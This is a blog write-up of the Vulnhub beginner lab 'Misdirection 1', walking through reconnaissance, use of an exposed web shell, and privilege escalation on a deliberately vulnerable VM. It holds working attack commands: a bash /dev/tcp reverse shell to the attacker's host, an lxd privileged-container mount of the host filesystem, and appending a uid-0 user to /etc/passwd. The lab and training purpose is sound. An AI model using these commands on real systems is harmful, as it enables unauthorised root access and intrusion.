<!doctype html><html lang=en><head><title>Vulnub: Misdirection 1 :: ikuamike</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/misdirection1/><meta name=twitter:card content="summary"><meta name=twitter:title content="Vulnub: Misdirection 1"><meta name=twitter:description content><link rel=stylesheet href=https://blog.ikuamike.io/assets/style.css><link rel=stylesheet href=https://blog.ikuamike.io/assets/green.css><link rel=stylesheet href=https://blog.ikuamike.io/style.css><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://blog.ikuamike.io/img/favicon/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnub: Misdirection 1"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/misdirection1/"><meta property="og:site_name" content="ikuamike"><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-04-21 00:00:00 +0000 UTC"></head><body class=green><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Show more ▾</li><ul class="menu__sub-inner-more hidden"><li><a href=/webinars>Webinars</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/webinars>Webinars</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/misdirection1/>Vulnub: Misdirection 1</a></h1><div class=post-meta><span class=post-date>2021-04-21</span></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/beginner/>Beginner</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/sudo/>Sudo</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/lxd/>lxd</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/writeable-passwd/>Writeable Passwd</a>&nbsp;</span><div class=post-content><div><img src=/img/misdirection1/misdirection.png class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Beginner</td><td>24 Sep 2019</td><td>FalconSpy</td></tr></tbody></table><h2 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h2><p>For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a
privileged container that can read and write the whole file system by mounting it in the container.</p><h2 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Nmap</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.191.136
Host is up <span style=color:#f92672>(</span>0.00032s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65531</span> closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
80/tcp   open  http    Rocket httpd 1.2.6 <span style=color:#f92672>(</span>Python 2.7.15rc1<span style=color:#f92672>)</span>
3306/tcp open  mysql   MySQL <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
8080/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</code></pre></div><h2 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=8080-http>8080 (HTTP)<a href=#8080-http class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Nmap</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#75715e># Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136</span>
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.191.136
Host is up <span style=color:#f92672>(</span>0.00026s latency<span style=color:#f92672>)</span>.

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
| http-enum:
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
|   /help/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
|   /images/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
|   /js/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
|   /manual/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
|_  /scripts/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
</code></pre></div><p>ffuf</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t <span style=color:#ae81ff>50</span> 
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>js                      <span style=color:#f92672>[</span>Status: 301, Size: 322, Words: 20, Lines: 10<span style=color:#f92672>]</span>
help                    <span style=color:#f92672>[</span>Status: 301, Size: 324, Words: 20, Lines: 10<span style=color:#f92672>]</span>
wordpress               <span style=color:#f92672>[</span>Status: 301, Size: 329, Words: 20, Lines: 10<span style=color:#f92672>]</span>
manual                  <span style=color:#f92672>[</span>Status: 301, Size: 326, Words: 20, Lines: 10<span style=color:#f92672>]</span>
debug                   <span style=color:#f92672>[</span>Status: 301, Size: 325, Words: 20, Lines: 10<span style=color:#f92672>]</span>
development             <span style=color:#f92672>[</span>Status: 301, Size: 331, Words: 20, Lines: 10<span style=color:#f92672>]</span>
shell                   <span style=color:#f92672>[</span>Status: 301, Size: 325, Words: 20, Lines: 10<span style=color:#f92672>]</span>
images                  <span style=color:#f92672>[</span>Status: 301, Size: 326, Words: 20, Lines: 10<span style=color:#f92672>]</span>
css                     <span style=color:#f92672>[</span>Status: 301, Size: 323, Words: 20, Lines: 10<span style=color:#f92672>]</span>
scripts                 <span style=color:#f92672>[</span>Status: 301, Size: 327, Words: 20, Lines: 10<span style=color:#f92672>]</span>
server-status           <span style=color:#f92672>[</span>Status: 403, Size: 305, Words: 22, Lines: 12<span style=color:#f92672>]</span>
                        <span style=color:#f92672>[</span>Status: 200, Size: 10918, Words: 3499, Lines: 376<span style=color:#f92672>]</span>
</code></pre></div><p>After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
contains a web shell.</p><img src=/img/misdirection1/misdirection-1.png class=center style=border-radius:8px><h2 id=shell-as-www-data>Shell as www-data<a href=#shell-as-www-data class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Supplying the following command we are able to get a reverse shell.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>bash -c <span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/192.168.191.1/9000 0&gt;&amp;1 &amp;&#39;</span>
</code></pre></div><p>shell:</p><img src=/img/misdirection1/misdirection-2.png class=center style=border-radius:8px><p>After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
any password requirement.</p><img src=/img/misdirection1/misdirection-3.png class=center style=border-radius:8px><h2 id=shell-as-brexit>Shell as brexit<a href=#shell-as-brexit class=hanchor arialabel=Anchor>&#8983;</a></h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>sudo -u brexit /bin/bash
</code></pre></div><img src=/img/misdirection1/misdirection-4.png class=center style=border-radius:8px><p>On running id we see that brexit is in the lxd group and no images are present.</p><img src=/img/misdirection1/misdirection-10.png class=center style=border-radius:8px><h2 id=shell-as-root>Shell as root<a href=#shell-as-root class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.</p><p>First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
7z x distrobuilder-1.2.zip
cd distrobuilder-distrobuilder-1.2 
make
</code></pre></div><p>You can use go get as the repo instructions recommend but for me it didn&rsquo;t work as expected.</p><p>With distrobuilder ready, download the alpine image yaml file to build a small alpine image for lxd</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
</code></pre></div><p>Then run distrobuilder with the alpine yaml file as below.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release<span style=color:#f92672>=</span>3.8
</code></pre></div><p>This will result in two files: lxd.tar.xz and rootfs.squashfs.</p><p>We then need to transfer this two files to our victim for privesc.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#75715e># on kali</span>

python3 -m http.server

<span style=color:#75715e># on victim</span>

wget 192.168.191.1:8000/lxd.tar.xz
wget 192.168.191.1:8000/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
</code></pre></div><img src=/img/misdirection1/misdirection-5.png class=center style=border-radius:8px><p>After adding the image we need to run lxd init and can keep everything default.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>lxd init
</code></pre></div><img src=/img/misdirection1/misdirection-7.png class=center style=border-radius:8px><p>Then create the container to be privileged and mount the host os file system inside it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>lxc init alpine privesc -c security.privileged<span style=color:#f92672>=</span>true
lxc config device add privesc host-root disk source<span style=color:#f92672>=</span>/ path<span style=color:#f92672>=</span>/mnt/root recursive<span style=color:#f92672>=</span>true
lxc start privesc
lxc exec privesc /bin/sh
</code></pre></div><p>With this we can read the host file system from inside the container and can read root.txt.</p><img src=/img/misdirection1/misdirection-8.png class=center style=border-radius:8px><p>To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.</p><img src=/img/misdirection1/misdirection-9.png class=center style=border-radius:8px><h2 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h2><p>After looking at other writeups, there was another easy privesc that I didn&rsquo;t explore.</p><ul><li>Writeable /etc/passwd file</li></ul><p>The passwd file is writeable by the users in the brexit group.</p><img src=/img/misdirection1/misdirection-11.png class=center style=border-radius:8px><p>We can add user with id 0 that will give us root privileges.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>openssl passwd -1 -salt user password123

echo <span style=color:#e6db74>&#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&#39;</span> &gt;&gt;/etc/passwd
</code></pre></div><img src=/img/misdirection1/misdirection-12.png class=center style=border-radius:8px><h2 id=references>References<a href=#references class=hanchor arialabel=Anchor>&#8983;</a></h2><pre><code>https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/

https://www.hackingarticles.in/lxd-privilege-escalation/

https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd
</code></pre></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/sar1/><span class=button__icon>←</span>
<span class=button__text>Vulnhub: Sar 1</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/lemonsqueezy1/><span class=button__text>Vulnhub: Lemon Squeezy 1</span>
<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>© Michael Ikua</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://blog.ikuamike.io/assets/main.js></script><script src=https://blog.ikuamike.io/assets/prism.js></script></div><script src=https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js></script><script>addBackToTop({diameter:40,backgroundColor:'rgb(120, 226, 160)',textColor:'#1F222A',cornerOffset:30})</script></body></html>